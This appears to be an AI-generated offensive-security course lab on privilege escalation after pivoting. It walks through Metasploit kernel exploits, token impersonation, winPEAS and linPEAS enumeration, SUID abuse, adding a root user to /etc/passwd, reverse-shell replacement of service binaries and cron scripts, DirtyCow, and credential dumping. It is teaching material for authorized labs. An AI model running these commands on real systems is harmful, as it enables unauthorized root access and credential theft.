### _Week 09 — Internal Network Exploitation & Lateral Movement_

**Estimated Time:** 150–210 minutes  
**Difficulty:** Advanced  
**Tools:** Meterpreter, Metasploit Framework, Windows & Linux privilege escalation scripts, winPEAS, linPEAS, SharpHound (optional), local exploit suggester, proxychains

---

## **1. Purpose of This Lab**

This lab teaches you how to **escalate privileges on internal Windows and Linux hosts** after gaining an initial foothold through pivoting.

By the end of this lab, you will be able to:

- Enumerate privilege escalation vectors on Windows and Linux
- Use Metasploit’s Local Exploit Suggester
- Exploit kernel vulnerabilities
- Abuse misconfigurations (services, SUID, PATH hijacking, weak permissions)
- Dump credentials after escalation
- Convert a low‑privilege foothold into SYSTEM/root
- Document a full privilege escalation chain

This is the final step before Week 10’s Active Directory labs.

---

## **2. Pre‑Lab Requirements**

You must have:

- Completed **Lab 9.1 (Pivoting)**
- Completed **Lab 9.2 (Internal Service Exploitation)**
- Completed **Lab 9.4 (Credential Harvesting)**
- At least one low‑privilege shell on an internal Windows or Linux host
- SOCKS proxy + proxychains configured

Example topology:

```
Kali → (Pivot Host) → Internal Host A (low-priv shell) → SYSTEM/root escalation
```

---

## **3. Lab Tasks**

---

# **SECTION A — WINDOWS PRIVILEGE ESCALATION**

---

# **Task 1 — Identify Current Privilege Level**

### **Objective**

Determine whether escalation is needed.

### **Steps**

From Meterpreter:

```
getuid
sysinfo
```

If you are not **NT AUTHORITY\SYSTEM**, escalation is required.

### **Deliverable**

A note confirming your current privilege level.

---

# **Task 2 — Run Metasploit Local Exploit Suggester**

### **Objective**

Identify kernel and privilege escalation vulnerabilities.

### **Steps**

```
use post/multi/recon/local_exploit_suggester
set SESSION 2
run
```

### **What to Observe**

- Kernel vulnerabilities
- Service misconfigurations
- Token impersonation opportunities

### **Deliverable**

A list of suggested exploits.

---

# **Task 3 — Exploit a Kernel Vulnerability (Example: MS10‑015)**

### **Objective**

Use a suggested exploit to escalate to SYSTEM.

### **Steps**

```
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 2
run
```

### **What to Observe**

- SYSTEM‑level Meterpreter session
- Ability to dump credentials

### **Deliverable**

A note confirming kernel‑based escalation.

---

# **Task 4 — Enumerate Windows PrivEsc Vectors Manually**

### **Objective**

Use winPEAS to identify misconfigurations.

### **Steps**

Upload winPEAS:

```
upload winPEASx64.exe
```

Run it:

```
execute -f winPEASx64.exe
```

### **What to Observe**

- Unquoted service paths
- Weak service permissions
- AlwaysInstallElevated
- Stored credentials
- Writable registry keys
- DLL hijacking opportunities

### **Deliverable**

A list of misconfigurations discovered.

---

# **Task 5 — Exploit a Misconfigured Service**

### **Objective**

Replace a service binary to gain SYSTEM.

### **Steps**

1. Identify a service with weak permissions.
2. Replace its executable with a reverse shell.
3. Restart the service.

### **What to Observe**

- SYSTEM‑level shell
- Persistence opportunities

### **Deliverable**

A note confirming service‑based escalation.

---

# **Task 6 — Token Impersonation (If Available)**

### **Objective**

Use Meterpreter’s token impersonation features.

### **Steps**

List tokens:

```
use incognito
list_tokens -u
```

Impersonate:

```
impersonate_token "NT AUTHORITY\SYSTEM"
```

### **What to Observe**

- SYSTEM privileges without kernel exploit
- Ability to dump credentials

### **Deliverable**

A note confirming token impersonation success.

---

---

# **SECTION B — LINUX PRIVILEGE ESCALATION**

---

# **Task 7 — Identify Current Privilege Level**

### **Objective**

Determine whether escalation is needed.

### **Steps**

From Meterpreter:

```
getuid
```

Or from shell:

```
id
```

### **Deliverable**

A note confirming your privilege level.

---

# **Task 8 — Run linPEAS for Linux Enumeration**

### **Objective**

Identify Linux privilege escalation vectors.

### **Steps**

Upload linPEAS:

```
upload linpeas.sh
```

Run it:

```
chmod +x linpeas.sh
./linpeas.sh
```

### **What to Observe**

- SUID binaries
- Writable /etc/passwd
- Cron jobs
- PATH hijacking
- Capabilities
- Docker/LXC breakout
- Kernel vulnerabilities

### **Deliverable**

A list of misconfigurations discovered.

---

# **Task 9 — Exploit SUID Binaries**

### **Objective**

Use SUID misconfigurations to escalate.

### **Steps**

List SUID binaries:

```
find / -perm -4000 2>/dev/null
```

Test known exploitable binaries (e.g., `find`, `vim`, `bash`):

```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

### **Deliverable**

A note confirming SUID‑based escalation.

---

# **Task 10 — Exploit Writable /etc/passwd**

### **Objective**

Add a new root user.

### **Steps**

If writable:

```
openssl passwd -1 hacked
```

Add to /etc/passwd:

```
hacker:$1$...:0:0:root:/root:/bin/bash
```

### **Deliverable**

A note confirming passwd‑based escalation.

---

# **Task 11 — Exploit Cron Jobs**

### **Objective**

Replace a script executed by root.

### **Steps**

1. Identify cron jobs:
    
    ```
    cat /etc/crontab
    ```
    
2. Replace script with reverse shell.

### **Deliverable**

A note confirming cron‑based escalation.

---

# **Task 12 — Kernel Exploits (DirtyCow Example)**

### **Objective**

Use kernel vulnerabilities to escalate.

### **Steps**

Upload exploit:

```
upload dirtycow.c
```

Compile:

```
gcc dirtycow.c -o dirtycow
```

Run:

```
./dirtycow
```

### **Deliverable**

A note confirming kernel‑based escalation.

---

---

# **Task 13 — Build a Full Privilege Escalation Chain**

### **Objective**

Document your entire escalation path.

### **Include:**

- Initial foothold
- Enumeration
- Exploits used
- Misconfigurations abused
- Final privilege level
- Credentials dumped
- New pivot opportunities

### **Deliverable**

A complete privilege escalation chain in your Obsidian vault.

---

## **4. Completion Criteria**

You have completed Lab 9.5 when you can:

- Enumerate Windows and Linux hosts for escalation
- Use Metasploit’s Local Exploit Suggester
- Exploit kernel vulnerabilities
- Abuse misconfigured services, SUID binaries, cron jobs, PATH hijacking
- Dump credentials after escalation
- Document a full privilege escalation chain

---

## **5. Next Steps**

When you’re ready, say:

**“Next lab.”**

And I’ll generate **Lab 9.6 — Persistence & Maintaining Access** in the same course style.